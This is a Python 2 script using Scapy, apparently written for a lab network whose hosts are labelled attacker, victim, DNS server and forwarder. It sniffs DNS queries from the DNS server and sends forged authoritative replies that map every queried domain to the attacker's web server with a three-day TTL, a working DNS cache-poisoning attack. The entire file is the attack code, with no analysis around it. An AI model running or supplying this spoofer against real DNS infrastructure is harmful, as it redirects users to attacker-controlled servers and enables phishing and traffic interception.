#!usr/bin/env python

from scapy.all import *
#import dnsSniffer

'''
Host name	IP address	MAC address	Interface
Gateway		192.168.99.1		
Attacker	192.168.99.100	08:00:27:0c:53:b7	Eth13
Observer/forwarder 	192.168.99.105	08:00:27:EA:AE:F7	Eth16
Victim		192.168.99.101	08:00:27:b1:47:d5	Eth14
Origweb server	192.168.99.103	08:00:27:53:da:a8	Eth14
Attackwebserver	192.168.99.104	08:00:27:09:1d:2d	Eth14
DNS server	192.168.99.102	08:00:27:b6:56:a3	Eth15
'''
dns_mac="08:00:27:B6:56:A3"
#mac-address of dns server is 08:00:27:B6:56:A3
dns_ip="192.168.99.102"
#ip address of dns
attacker_web_ip="192.168.99.104"
#ip address of web server of attacker which is different from attacker's ip
forwarder_ip="192.168.99.105"
#ip address of forwarder

forwarder_mac="08:00:27:EA:AE:F7"
#mac-address of forwarder

def dnsSniffer(pkt):
	if (DNS in pkt and pkt[IP].src==dns_ip and pkt[IP].dst==forwarder_ip and pkt[UDP].dport==53 and pkt[DNS].qr==0):
		#"sniffing query and sending a spoofed response"
		src_ip=pkt[IP].src
		src_port=pkt[UDP].sport
		domainQuery=pkt[DNS].qd.qname
		tx_id=pkt[DNS].id
		#print src_ip+" from port "+ str(src_port)+" is asking for "+domainQuery +"with tx id = " + str(tx_id)
		sendForgedPacket(pkt)
		#return ['query',src_ip,src_port,domainQuery,tx_id]
	
def sendForgedPacket(pkt):
	print pkt.summary()
	src_port_query=pkt[UDP].sport
	domainQuery=pkt[DNS].qd.qname
	tx_id_query=pkt[DNS].id			
	eth=Ether(src=forwarder_mac,dst= dns_mac)
	
	ip=IP(dst=dns_ip,src=forwarder_ip)
	udp=UDP(sport=53,dport=src_port_query)
	dns=DNS(id=tx_id_query,qr=1,aa=1,rd=0,ra=0,ancount=1,qd=DNSQR(qname=domainQuery,qtype='A'),an=DNSRR(rrname=domainQuery,rdata=attacker_web_ip)/DNSRR(rrname=domainQuery, type='A', rdata=attacker_web_ip, ttl=259200))
	pkt_forged=eth/ip/udp/dns
	print pkt_forged.summary()
	for i in range(0,3):
		sendp(pkt_forged,iface="eth13")	

def main():
	a=sniff(iface="eth13",filter="udp port 53 and host 192.168.99.102",prn=dnsSniffer,store=0)
	#a=dnsSniffer.dnsQuerySniffer(pktQuery)
	
	
	
main()

